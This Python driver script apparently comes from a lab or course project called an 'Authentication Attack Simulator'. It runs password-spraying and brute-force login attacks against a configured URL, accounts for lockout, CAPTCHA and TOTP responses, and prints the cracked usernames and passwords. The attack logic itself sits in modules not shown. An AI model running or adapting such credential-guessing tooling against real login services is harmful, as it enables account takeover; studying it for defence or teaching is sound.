import argparse

from config import *
from utils.files import load_file
from utils.timer import Timer
from core.client import HttpClient
from core.user import TargetUserState
from attacks.password_spray import PasswordSprayAttack
from attacks.brute_force import BruteForceAttack


def run_password_spray(client, timer, passwords):
    users = [TargetUserState(u) for u in load_file(USERS_FILE)]

    print("Starting Password Spraying Attack:")
    attack = PasswordSprayAttack(
        client=client,
        timer=timer,
        success_code=SUCCESS_CODE,
        lockout_code=LOCKED_CODE,
        captcha_code=CAPTCHA_CODE,
        totp_code=TOTP_CODE,
        max_time=MAX_ATTACK_TIME,
        max_attempts=MAX_ATTEMPTS,
        users=users,
        passwords=passwords
    )

    attack.run()
    print("Password Spraying Attack finished")

    for user, (password, t) in attack.hacked.items():
        print(f"{user:<20} {password:<20} {t:.2f}s")


def run_brute_force(client, timer, passwords):
    print(f"Starting Brute Force Attack on user: {USER_TO_BRUTE_FORCE}")

    attack = BruteForceAttack(
        client=client,
        timer=timer,
        success_code=SUCCESS_CODE,
        lockout_code=LOCKED_CODE,
        captcha_code=CAPTCHA_CODE,
        totp_code=TOTP_CODE,
        max_time=MAX_ATTACK_TIME,
        max_attempts=MAX_ATTEMPTS,
        user=TargetUserState(USER_TO_BRUTE_FORCE),
        passwords=passwords
    )

    attack.run()
    print("Brute Force Attack finished")

    for user, (password, t) in attack.hacked.items():
        print(f"{user:<20} {password:<20} {t:.2f}s")


def main():
    parser = argparse.ArgumentParser(description="Authentication Attack Simulator")
    parser.add_argument(
        "--attack",
        required=True,
        choices=["spray", "brute_force", "both"],
        help="Attack type to run"
    )
    args = parser.parse_args()

    passwords = load_file(PASSWORDS_FILE)
    timer = Timer()
    client = HttpClient(URL, CAPTCHA_URL, GROUP_SEED, REQUEST_TIMEOUT)

    if args.attack == "spray":
        run_password_spray(client, timer, passwords)

    elif args.attack == "brute_force":
        run_brute_force(client, timer, passwords)

    elif args.attack == "both":
        run_password_spray(client, timer, passwords)
        run_brute_force(client, timer, passwords)

    else:
        raise NotImplementedError(f"Attack {args.attack} is not supported")


if __name__ == "__main__":
    main()
